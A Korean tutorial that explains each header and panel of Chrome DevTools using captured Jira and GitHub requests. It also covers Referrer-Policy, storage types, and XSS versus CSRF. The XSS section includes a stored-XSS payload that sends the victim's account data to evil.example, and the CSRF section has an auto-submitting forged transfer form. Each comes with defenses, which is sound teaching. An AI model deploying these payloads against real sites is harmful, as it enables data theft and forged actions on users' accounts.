# DevTools Network 탭으로 HTTP 요청 읽기

Chrome 개발자 도구(DevTools) Network 탭에서 요청 하나를 클릭하면 보이는 항목을 key별로 정리한다.
예시는 실제로 캡처한 요청 2건이다.

- **A**: Jira에서 이슈 본문을 저장할 때 나가는 GraphQL 요청 (`POST`)
- **B**: GitHub 이슈에 이미지를 첨부할 때 나가는 업로드 확정 요청 (`PUT`)

뒤쪽에는 문답 중에 나온 Referrer-Policy, XSS와 CSRF, Application 탭 내용을 보충했다.

> 토큰·쿠키·계정 식별자처럼 노출되면 안 되는 값은 `<redacted>`로 가렸다.
> DevTools 캡처를 공유할 때는 `cookie`, `set-cookie`, `*-xsrf-token`, `authenticity_token`, `authorization`을 꼭 지운다.

## 패널 구성

| 탭 | 보여주는 것 |
| --- | --- |
| Headers | General(요청 요약), Response headers(서버 → 브라우저), Request headers(브라우저 → 서버) |
| Payload | 요청 본문과 URL 쿼리 문자열. GET 요청이면 쿼리 문자열만 있다 |
| Preview | 응답 본문을 보기 좋게 렌더링한 것 (JSON 트리, 이미지 등) |
| Response | 응답 본문 원문 |
| Initiator | 이 요청을 발생시킨 코드 위치(호출 스택)나 상위 요청 |

## Headers > General

| key | 예시 값 | 뜻 |
| --- | --- | --- |
| Request URL | A: `https://<site>.atlassian.net/gateway/api/graphql/pq/<sha256>?operation=WorkItemRichTextFieldMutation`<br>B: `https://github.com/upload/assets/<id>` | 요청 대상의 전체 URL. A의 `pq/<64자리 hex>`는 persisted query의 해시(SHA-256)다 |
| Request method | A: `POST`, B: `PUT` | HTTP 메서드. `PUT`은 "이 자원을 이 상태로 만든다"는 의미여서, 이미 만들어진 업로드 슬롯을 확정할 때 쓴다 |
| Status code | `200 OK` | 응답 상태 코드 |
| Remote address | `x.x.x.x:9090` | 브라우저가 실제로 TCP 연결을 맺은 IP:포트. 프록시를 쓰면 목적지 서버가 아니라 프록시 주소가 찍힌다 |
| Referrer policy | `strict-origin-when-cross-origin` | 이 요청에 `referer` 헤더를 얼마나 담을지 정한 정책. 같은 출처면 전체 URL, 다른 출처면 origin만, HTTPS→HTTP면 보내지 않는다. 자세한 내용은 [Referrer-Policy 자세히](#referrer-policy-자세히) |

## Headers > Response headers

서버(또는 중간 CDN·프록시)가 붙여 보낸 헤더다.

### 공통 HTTP

| key | 예시 값 | 뜻 |
| --- | --- | --- |
| cache-control | A: `no-cache, no-store, max-age=0, must-revalidate`<br>B: `max-age=0, private, must-revalidate` | 캐시 규칙. `no-store`는 저장 금지, `no-cache`는 쓰기 전에 서버에 재검증, `private`은 브라우저만 저장 가능(CDN 같은 공유 캐시는 불가), `max-age=0`은 곧바로 만료 |
| connection | `keep-alive` | 응답 후 TCP 연결을 끊지 않고 재사용. HTTP/1.1 헤더라 HTTP/2·3에서는 쓰지 않는다 |
| content-type | `application/json; charset=utf-8` | 응답 본문의 형식(MIME type)과 문자 인코딩 |
| date | `Fri, 20 Nov 2026 04:41:20 GMT` | 서버가 응답을 만든 시각(GMT) |
| expires | `0` | 만료 시각. 유효한 날짜가 아니면 "이미 만료"로 본다. `cache-control`보다 오래된 방식이다 |
| pragma | `no-cache` | HTTP/1.0 시절의 캐시 금지 헤더. 오래된 캐시와의 호환용으로 남아 있다 |
| etag | `W/"<hash>"` | 응답 버전 식별자. `W/`는 의미만 같으면 되는 약한(weak) 비교. 다음 요청 때 `If-None-Match`로 보내 `304`를 받을 수 있다 |
| vary | `Accept-Encoding, Accept, X-Requested-With, ...` | 캐시가 응답을 구분할 때 함께 봐야 할 요청 헤더 목록. 값이 다르면 다른 응답으로 저장한다 |
| transfer-encoding | `chunked` | 전체 길이를 미리 모른 채 조각(chunk)으로 나눠 전송. 그래서 `content-length`가 없다 |
| server | A: `AtlassianEdge`, B: `github.com` | 응답한 서버 소프트웨어 이름. 보통 일부러 흐릿하게 적는다 |
| set-cookie | `Name=Value; Domain=...; Path=/; Secure; HttpOnly; SameSite=Strict` | 브라우저에 쿠키를 저장시킨다. 속성 뜻은 아래 별도 표 참고 |

`set-cookie` 속성:

| 속성 | 뜻 |
| --- | --- |
| Domain | 쿠키를 보낼 도메인 범위. `.example.com`이면 하위 도메인까지 포함 |
| Path | 쿠키를 보낼 URL 경로 범위 |
| Secure | HTTPS 요청에만 보낸다 |
| HttpOnly | JavaScript(`document.cookie`)로 읽을 수 없다. XSS로 세션 쿠키를 훔치는 것을 막는다 |
| SameSite | 다른 사이트에서 시작한 요청에 쿠키를 실을지 정한다. `Strict`는 절대 안 실음, `Lax`는 링크 이동 같은 최상위 GET만 허용 |
| `__Host-` 접두사 | 이름이 `__Host-`로 시작하면 `Secure`, `Path=/`, Domain 없음 조건을 지켜야 한다(어기면 브라우저가 저장을 거부). 하위 도메인이 쿠키를 덮어쓰지 못하게 하는 장치 |

### 보안 헤더

| key | 예시 값 | 뜻 |
| --- | --- | --- |
| strict-transport-security | `max-age=63072000; includeSubDomains; preload` | HSTS. 앞으로 2년(63072000초) 동안 이 도메인과 하위 도메인은 HTTPS로만 접속하라는 지시. `preload`는 브라우저 내장 HSTS 목록 등재를 원한다는 표시 |
| content-security-policy | `default-src 'none'; base-uri 'self'; child-src github.githubassets.com ...` | CSP. 이 응답이 문서로 열릴 때 스크립트·iframe 등을 어디서 불러올 수 있는지 허용 목록으로 제한한다. `'none'`은 전부 차단이 기본값이라는 뜻 |
| x-content-type-options | `nosniff` | 브라우저가 `content-type`을 무시하고 내용을 추측(MIME sniffing)하지 못하게 한다 |
| x-frame-options | `DENY` | 다른 페이지의 `<iframe>` 안에 넣지 못하게 한다(클릭재킹 방지). 요즘은 CSP `frame-ancestors`가 대체 |
| x-xss-protection | A: `1; mode=block`, B: `0` | 옛 브라우저의 XSS 필터 설정. 필터 자체가 오히려 취약점이 되어 지금은 `0`(끄기)이 권장값이다. B(GitHub)가 최신 권장을 따른 쪽 |
| referrer-policy | A: `no-referrer`<br>B: `origin-when-cross-origin, strict-origin-when-cross-origin` | 이 응답이 문서로 쓰일 때, 거기서 나가는 요청의 `referer` 정책. 여러 개면 브라우저가 지원하는 마지막 값을 쓴다 |

### CDN·관측(모니터링)

| key | 예시 값 | 뜻 |
| --- | --- | --- |
| via | `1.1 <id>.cloudfront.net (CloudFront)` | 응답이 거쳐 온 프록시 목록. `1.1`은 그 구간의 HTTP 버전. 여기서는 AWS CloudFront를 거쳤다 |
| x-cache | `Miss from cloudfront` | CDN 캐시 적중 여부. `Miss`면 CDN에 없어서 원 서버(origin)까지 갔다 |
| x-amz-cf-pop | `ICN57-P3` | 응답한 CloudFront 엣지 위치(POP). `ICN`은 인천 공항 코드 |
| x-amz-cf-id | `<redacted>` | CloudFront가 붙인 요청 ID. AWS 측 로그 조회용 |
| server-timing | `cdn-upstream-layer;desc="EDGE",cdn-upstream-dns;dur=0,cdn-upstream-connect;dur=0,cdn-upstream-fbl;dur=798,...` | 서버 쪽 처리 시간 측정값. DevTools Timing 탭에도 표시된다. `cdn-upstream-fbl`은 CDN이 원 서버에서 첫 바이트를 받기까지 걸린 시간(ms) |
| nel | `{"failure_fraction": 0.01, "report_to": "endpoint-1", "max_age": 600, ...}` | Network Error Logging. 이 사이트에 접속하다 실패하면 1%(0.01) 비율로 `report_to` 그룹에 보고하라는 설정 |
| report-to | `{"group": "endpoint-1", "endpoints": [{"url": "https://<id>.cloudfront.net"}], ...}` | 보고서(NEL, CSP 위반 등)를 보낼 엔드포인트 그룹 정의. `nel`의 `report_to` 이름과 연결된다 |
| atl-request-id | `<uuid>` | Atlassian 서버가 붙인 요청 ID |
| atl-traceid, x-trace-id | `<trace id>` | 분산 추적 ID. 요청 헤더의 `x-b3-traceid`와 같은 값이라, 여러 서비스 로그를 한 요청으로 묶어 볼 수 있다 |
| x-github-request-id | `<redacted>` | GitHub 요청 ID. GitHub 지원팀에 문의할 때 쓰는 값 |
| x-github-edge-region | `koreacentral` | 응답한 GitHub 엣지 리전 |
| x-fetch-nonce | `v2:<uuid>` | 요청 헤더의 같은 값을 되돌려준 것. 응답이 이 요청의 짝임을 확인하는 GitHub 자체 헤더 |

## Headers > Request headers

브라우저가 서버로 보낸 헤더다.

### 표준 HTTP

| key | 예시 값 | 뜻 |
| --- | --- | --- |
| accept | A: `application/graphql-response+json, application/json, multipart/mixed;deferSpec=20220824`<br>B: `application/json` | 받고 싶은 응답 형식. A의 `multipart/mixed;deferSpec=...`는 GraphQL `@defer` 결과를 여러 조각으로 나눠 받을 수 있다는 표시 |
| accept-encoding | `gzip, deflate, br, zstd` | 지원하는 압축 방식. 서버는 이 중 하나로 압축해 보낸다 |
| accept-language | `ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7` | 선호 언어. `q`는 가중치(1이 최고)로, 한국어 우선 → 영어 순이다 |
| cache-control | `no-cache` | 요청 쪽 캐시 지시. 캐시에 있더라도 서버에 재검증하고 받으라는 뜻 |
| pragma | `no-cache` | 위와 같은 뜻의 HTTP/1.0 호환용 헤더 |
| connection | `keep-alive` | 연결 재사용 요청 |
| content-length | A: `2120`, B: `235` | 요청 본문 크기(바이트) |
| content-type | A: `application/json`<br>B: `multipart/form-data; boundary=----WebKitFormBoundary<random>` | 요청 본문 형식. `multipart/form-data`는 여러 필드를 `boundary` 문자열로 구분해 담는다 |
| cookie | `<redacted>` | 브라우저가 이 도메인에 저장해 둔 쿠키 전부. 로그인 세션이 들어 있어 **절대 공유 금지** |
| host | `<site>.atlassian.net` | 요청 대상 호스트. 한 IP에 여러 사이트가 있어도 이 값으로 구분한다 |
| origin | `https://<site>.atlassian.net` | 요청을 시작한 페이지의 출처(scheme + host + port). CORS와 CSRF 검사에 쓰인다 |
| referer | `https://<site>.atlassian.net/jira/software/projects/<KEY>/list?...` | 요청을 보낸 페이지 URL. 철자가 틀린 `referer`가 표준 이름이다(역사적 오타) |
| user-agent | `Mozilla/5.0 (Windows NT 10.0; Win64; x64) ... Chrome/157.0.0.0 Safari/537.36` | 브라우저·OS 정보. 호환성 때문에 `Mozilla`, `Safari` 같은 옛 이름이 관습적으로 붙는다 |

### 브라우저가 자동으로 붙이는 헤더 (Fetch Metadata, Client Hints)

JavaScript로 바꿀 수 없어 서버가 믿고 쓸 수 있는 값이다.

| key | 예시 값 | 뜻 |
| --- | --- | --- |
| sec-fetch-site | `same-origin` | 요청을 시작한 페이지와 대상의 관계: `same-origin` / `same-site` / `cross-site` / `none`(주소창 직접 입력) |
| sec-fetch-mode | `cors` | 요청 방식: `navigate`(페이지 이동), `cors`(`fetch`/XHR), `no-cors`, `same-origin`, `websocket` |
| sec-fetch-dest | `empty` | 응답을 어디에 쓸지: `document`, `image`, `script` 등. `fetch`/XHR이면 `empty` |
| sec-ch-ua | `"Not-A.Brand";v="99", "Google Chrome";v="157", "Chromium";v="157"` | User-Agent Client Hints의 브라우저 브랜드·버전. `Not-A.Brand`는 문자열 파싱에 기대지 말라고 일부러 넣는 가짜 항목 |
| sec-ch-ua-mobile | `?0` | 모바일 여부. `?0`은 false (Structured Header 불리언 표기) |
| sec-ch-ua-platform | `"Windows"` | OS 플랫폼 |

### 서비스 자체(커스텀) 헤더

| key | 서비스 | 뜻 |
| --- | --- | --- |
| atl-xsrf-token | Jira | CSRF 방지 토큰. 쿠키와 별도로 헤더에 실어, 다른 사이트가 몰래 보낸 요청과 구분한다. **공유 금지** |
| atl-attribution | Jira | 요청을 보낸 제품·서비스·워크스페이스 정보(JSON). 사용량 집계용 |
| atl-client-name, atl-client-version | Jira | 요청을 보낸 프론트엔드 앱 이름과 빌드 버전 |
| x-atlassian-capability | Jira | 이 요청이 수행하는 기능 이름(`EDIT_ISSUE_DESCRIPTION_FIELD`). 기능별 모니터링용 |
| x-b3-traceid, x-b3-spanid | Jira | Zipkin B3 형식의 분산 추적 ID. traceid는 요청 전체, spanid는 그중 한 구간 |
| x-experimentalapi | Jira | 실험 단계 GraphQL 스키마를 쓰겠다는 opt-in 목록 |
| x-query-context | Jira | 요청이 속한 사이트를 가리키는 Atlassian 리소스 식별자(ARI) |
| x-request-fallback-to-post-reason | Jira | persisted query는 원래 캐시하기 좋은 GET으로 보내는데, 이번에는 POST로 바꾼 이유. 값 `mutation`은 "데이터를 바꾸는 요청이라서"라는 뜻 (헤더 이름으로 본 추정) |
| x-requested-with | GitHub | `XMLHttpRequest`. 페이지 이동이 아닌 스크립트 요청임을 서버에 알리는 관습 헤더 |
| x-github-client-version | GitHub | 프론트엔드 빌드 커밋 해시 |
| github-is-react, github-verified-fetch | GitHub | React로 렌더링한 화면에서 GitHub 자체 fetch 래퍼로 보낸 요청이라는 표시 |
| x-fetch-nonce | GitHub | 요청마다 새로 만드는 일회용 값. 응답에서 같은 값이 돌아온다 |

## Payload

| key | 예시 | 뜻 |
| --- | --- | --- |
| Query string parameters | A: `operation=WorkItemRichTextFieldMutation` | URL `?` 뒤의 값. A는 실행할 GraphQL 연산 이름을 사람이 읽기 쉽게 붙여 둔 것 |
| Request payload | A: GraphQL `variables` JSON | `application/json` 본문. persisted query라서 쿼리 본문 없이 변수만 보낸다 |
| Form data | B: `authenticity_token=<redacted>` | `multipart/form-data` 또는 폼 인코딩 본문. `authenticity_token`은 Rails의 CSRF 토큰이다 |

> B의 `content-length`는 235바이트뿐인데 업로드한 이미지는 187455바이트다.
> 실제 파일은 이 요청 전에 별도 저장소로 먼저 올라가고, 이 `PUT`은 "업로드 완료"만 확정하는 단계이기 때문이다.

## Preview / Response

B 응답 본문(JSON):

| key | 예시 값 | 뜻 |
| --- | --- | --- |
| id | `<id>` | 업로드된 자산 ID. Request URL의 숫자와 같다 |
| name | `<file>.png` | 저장된 파일 이름 |
| size | `187455` | 파일 크기(바이트) |
| content_type | `image/png` | 파일 MIME type |
| href | `https://github.com/user-attachments/assets/<uuid>` | 이슈 본문에 삽입되는 최종 이미지 URL |
| original_name | `null` | 사용자가 올린 원래 파일 이름 (이 경우 비어 있음) |

## Initiator

| key | 예시 | 뜻 |
| --- | --- | --- |
| Request call stack | A: `buildGraphqlSmartFetch.ts:79` → `fetch.ts:221` → `retryOnError.tsx:28`<br>B: `verified-fetch.ts:39` → `react-dom-client-<hash>.js:1` | 요청을 만든 JavaScript 호출 스택. 위가 마지막 호출이다. 파일명이 `.ts`로 보이는 것은 source map 덕분 |
| `Promise.then`, `await in (anonymous)` | | 비동기 경계. 그 아래는 Promise가 이어지기 전의 스택이다 |
| `(anonymous)` | | 이름 없는 함수(화살표 함수 등) |

## Referrer-Policy 자세히

`referer` 헤더에는 "어느 페이지에서 이 요청을 보냈는가"가 담긴다.
URL의 경로와 쿼리에 검색어, 문서 ID, 토큰 같은 정보가 섞일 수 있어서, 다른 사이트에 얼마나 알려줄지를 정책으로 정한다.

### 판단 기준 세 가지

1. **같은 출처(same-origin)인가**: scheme, host, port가 모두 같은지 본다. `a.example`과 `sub.a.example`은 같은 사이트(same-site)지만 출처는 다르다(cross-origin).
2. **다운그레이드인가**: HTTPS 페이지에서 HTTP로 요청하는지 본다. 암호화되지 않은 구간으로 정보가 새는 경우다.
3. **얼마나 보낼까**: 전체 URL, origin만(`https://a.example/`), 아무것도 안 보냄 중 하나다.
   - 전체 URL을 보낼 때도 `#fragment`와 `user:password@` 부분은 언제나 빠진다.

### 값별 동작

`https://a.example/page?id=1#top` 페이지에서 요청을 보낸다고 하자.

| 정책 | 같은 출처<br>`https://a.example/x` | 다른 출처(HTTPS)<br>`https://b.example/` | 다운그레이드<br>`http://c.example/` |
| --- | --- | --- | --- |
| `no-referrer` | 없음 | 없음 | 없음 |
| `no-referrer-when-downgrade` | 전체 URL | **전체 URL** | 없음 |
| `origin` | origin | origin | origin |
| `origin-when-cross-origin` | 전체 URL | origin | origin |
| `same-origin` | 전체 URL | 없음 | 없음 |
| `strict-origin` | origin | origin | 없음 |
| `strict-origin-when-cross-origin` (현재 브라우저 기본값) | 전체 URL | origin | 없음 |
| `unsafe-url` | 전체 URL | 전체 URL | 전체 URL |

- **`strict-origin-when-cross-origin`**: 정책을 지정하지 않았을 때 Chrome 85 이후 브라우저가 쓰는 기본값이다.
  - 같은 사이트 안에서는 분석과 디버깅에 필요한 전체 URL을 보낸다.
  - 다른 사이트에는 "어느 사이트에서 왔는지"만 알린다.
  - 다운그레이드에는 아무것도 보내지 않는다.
  - 이름의 `strict`는 다운그레이드 차단, `when-cross-origin`은 출처가 다를 때만 줄인다는 뜻이다.
- **`no-referrer-when-downgrade`**: 예전 브라우저의 기본값이다. 다운그레이드만 막고 나머지에는 전부 전체 URL을 보낸다.
  - 그래서 `https://a.example/reset?token=abc` 같은 URL이 광고·분석 스크립트나 외부 이미지 서버에 그대로 전달됐다.
  - 이 누출 때문에 지금의 기본값으로 바뀌었다.

### 정책이 정해지는 곳 (뒤로 갈수록 우선)

1. 브라우저 기본값
2. 문서 응답의 `Referrer-Policy` 헤더, 또는 `<meta name="referrer" content="...">`
3. 요청 단위 지정: `<a referrerpolicy="...">`, `rel="noreferrer"`, `fetch(url, { referrerPolicy: "..." })`

예시 A를 보면, 요청 General에는 `strict-origin-when-cross-origin`이 찍혔고 응답 헤더에는 `referrer-policy: no-referrer`가 있다.
요청에 적용된 정책은 이 `fetch`를 보낸 **Jira 페이지 문서**의 정책이다. JSON 응답에 붙은 `no-referrer`는 이 응답이 문서로 열릴 때만 의미가 있어서, 요청 쪽 정책에는 영향을 주지 않는다.

## XSS와 CSRF

두 공격 모두 "로그인한 사용자의 권한으로 원치 않는 일을 시킨다"는 점은 같다. 차이는 **공격 코드가 어디서 실행되는가**다.

| | XSS (Cross-Site Scripting) | CSRF (Cross-Site Request Forgery) |
| --- | --- | --- |
| 공격 코드가 실행되는 곳 | **피해 사이트 안** (같은 origin) | **공격자 사이트**. 피해 사이트로 요청만 보낸다 |
| 악용하는 신뢰 | 사이트가 사용자 입력을 그대로 화면에 출력한다 | 사이트가 "쿠키가 붙어 온 요청 = 본인 요청"이라고 믿는다 |
| 응답을 읽을 수 있나 | 읽을 수 있다. 같은 origin이라 DOM, API 응답, CSRF 토큰까지 볼 수 있다 | 못 읽는다. Same-Origin Policy 때문에 요청을 보내는 것까지만 된다 (blind) |
| 할 수 있는 일 | 사용자가 그 사이트에서 할 수 있는 거의 모든 것 | 미리 정해 둔 상태 변경 요청 하나 (송금, 설정 변경 등) |
| 서로의 관계 | XSS가 있으면 CSRF 방어는 무력해진다. 페이지 안에서 토큰을 읽어 정상 요청처럼 보낼 수 있기 때문이다 | CSRF 방어(토큰, SameSite)는 XSS를 막지 못한다 |

### 예시: XSS

예시 A는 Jira 이슈 본문(rich text)을 저장하는 요청이다. 서버가 본문의 HTML을 걸러내지 않는다고 가정하자.

1. 공격자가 이슈 본문에 아래 내용을 넣고 저장한다 (stored XSS).
   ```html
   <img src="x" onerror="
     fetch('/rest/api/3/myself').then(r => r.json())
       .then(me => fetch('https://evil.example/log', { method: 'POST', body: JSON.stringify(me) }))
   ">
   ```
2. 다른 사용자가 이 이슈를 열면, 스크립트가 `https://<site>.atlassian.net` origin에서 실행된다.
3. 같은 origin의 API를 그 사용자 권한으로 호출하고, 결과를 공격자 서버로 보낸다.
   - 세션 쿠키에 `HttpOnly`가 있으면 `document.cookie`로 쿠키 값을 훔치지는 못한다.
   - 하지만 쿠키는 요청에 자동으로 붙으므로, "사용자인 척 행동하기"는 여전히 된다.

**방어**
- 출력할 때 이스케이프한다. rich text는 허용 태그 목록으로 정제(sanitize)한다.
- CSP로 인라인 스크립트와 외부 스크립트 출처를 제한한다. 예시 B의 `default-src 'none'`이 이런 설정이다.
- 세션 쿠키에 `HttpOnly`를 붙인다.

### 예시: CSRF

사용자가 `bank.example`에 로그인한 상태로 공격자의 페이지 `https://evil.example`을 연다.

```html
<form action="https://bank.example/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000000">
</form>
<script>document.forms[0].submit()</script>
```

- 브라우저는 `bank.example`로 POST를 보내면서 그 도메인의 쿠키를 붙인다. 서버는 본인 요청으로 보고 송금한다.
- 공격자는 응답을 볼 수 없다. 하지만 송금 자체가 목적이라 응답을 볼 필요가 없다.

**방어** (이 문서의 예시 헤더와 연결된다)
- **CSRF 토큰**: 페이지에 심어 둔 비밀값을 요청에 함께 보내게 한다. 공격자 페이지는 이 값을 읽을 수 없다.
  - 예시 A의 `atl-xsrf-token`(헤더), 예시 B의 `authenticity_token`(폼 필드)이 이것이다.
- **SameSite 쿠키**: `Lax`나 `Strict`이면 다른 사이트에서 시작한 POST에는 쿠키가 붙지 않는다. Chrome 계열은 `SameSite`를 지정하지 않은 쿠키를 `Lax`로 취급한다(브라우저마다 다름).
- **출처 확인**: 서버가 `origin` 헤더나 `sec-fetch-site: cross-site`를 보고 거부한다.
- **JSON 본문 요구**: 예시 A는 `content-type: application/json`이다.
  - HTML 폼으로는 이 형식의 요청을 만들 수 없다.
  - JavaScript로 다른 출처에 보내려 하면 CORS preflight가 먼저 나가고, 서버가 허용하지 않으면 본 요청은 전송되지 않는다.

## 부록: Application 탭

Network 탭이 "오가는 요청"을 보여준다면, Application 탭은 **브라우저에 저장된 상태**를 보여준다.
왼쪽 Storage 영역에서 origin별로 저장된 값을 보고, 고치고, 지울 수 있다.

### 저장소 비교

| | Cookies | Local Storage | Session Storage | IndexedDB |
| --- | --- | --- | --- | --- |
| 범위 | 도메인 + 경로 (`Domain`, `Path` 속성) | origin | origin + **탭** | origin |
| 수명 | `Expires`/`Max-Age`까지. 없으면 브라우저를 닫을 때 삭제(세션 쿠키) | 직접 지울 때까지 | 탭을 닫으면 삭제 (새로고침에는 유지) | 직접 지울 때까지 |
| 용량 | 쿠키 1개당 약 4KB | origin당 약 5MB | origin당 약 5MB | 디스크 용량에 비례하는 큰 할당량 |
| 서버로 자동 전송 | **매 요청마다 전송** | 안 함 | 안 함 | 안 함 |
| JavaScript 접근 | `document.cookie` (`HttpOnly`면 불가) | `localStorage.getItem()` | `sessionStorage.getItem()` | `indexedDB.open()` 비동기 API |
| 데이터 형식 | 문자열 | 문자열 (객체는 `JSON.stringify`) | 문자열 | 객체, Blob, 파일 등 구조화된 데이터 + 인덱스 |
| API 동작 | - | 동기 (큰 데이터는 화면을 멈추게 함) | 동기 | 비동기, 트랜잭션 |
| 주 용도 | 로그인 세션, 서버가 알아야 하는 설정 | 테마, 언어처럼 오래 두는 UI 설정 | 폼 임시 입력, 탭별 상태 | 오프라인 데이터, 대용량 캐시 |

- 같은 페이지를 새 탭에서 열면 Session Storage는 새로 시작한다. 탭 복제는 그 시점의 값을 복사해 간다.
- Local Storage와 Session Storage는 XSS가 일어나면 스크립트가 그대로 읽을 수 있다.
  - 그래서 로그인 토큰은 여기보다 `HttpOnly` 쿠키에 두는 편이 안전하다.

### Cookies 화면의 열

| 열 | 뜻 |
| --- | --- |
| Name, Value | 쿠키 이름과 값 |
| Domain, Path | 쿠키를 보낼 범위 ([`set-cookie` 속성](#공통-http) 참고) |
| Expires / Max-Age | 만료 시각. `Session`이면 세션 쿠키 |
| Size | 이름 + 값의 바이트 수 |
| HttpOnly, Secure | 체크되어 있으면 해당 속성이 켜져 있음 |
| SameSite | `Strict` / `Lax` / `None`. 비어 있으면 Chrome은 `Lax`로 취급 |
| Partition Key | 파티션 쿠키(CHIPS)일 때, 어느 최상위 사이트 아래에서 저장됐는지 |
| Priority | 쿠키 수가 한도를 넘을 때 먼저 지울 순서 (`Low` / `Medium` / `High`) |

### 그 밖의 항목 (한 줄 요약)

- **Cache storage**: Service Worker가 `Cache` API로 저장한 요청·응답 쌍. 오프라인 대응용
- **Service workers**: 페이지와 네트워크 사이에서 요청을 가로채는 백그라운드 스크립트의 등록 상태
- **Storage**: origin별 사용량 확인과 "Clear site data"로 한 번에 지우기

## 참고

- [MDN: HTTP headers](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers)
- [MDN: Fetch metadata request header](https://developer.mozilla.org/en-US/docs/Glossary/Fetch_metadata_request_header)
- [MDN: Set-Cookie](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie)
- [MDN: Server-Timing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Server-Timing)
- [Chrome DevTools: Network features reference](https://developer.chrome.com/docs/devtools/network/reference)
- [MDN: Referrer-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy)
- [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP: Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [Chrome DevTools: Application panel](https://developer.chrome.com/docs/devtools/storage/localstorage)
- [MDN: Web Storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)
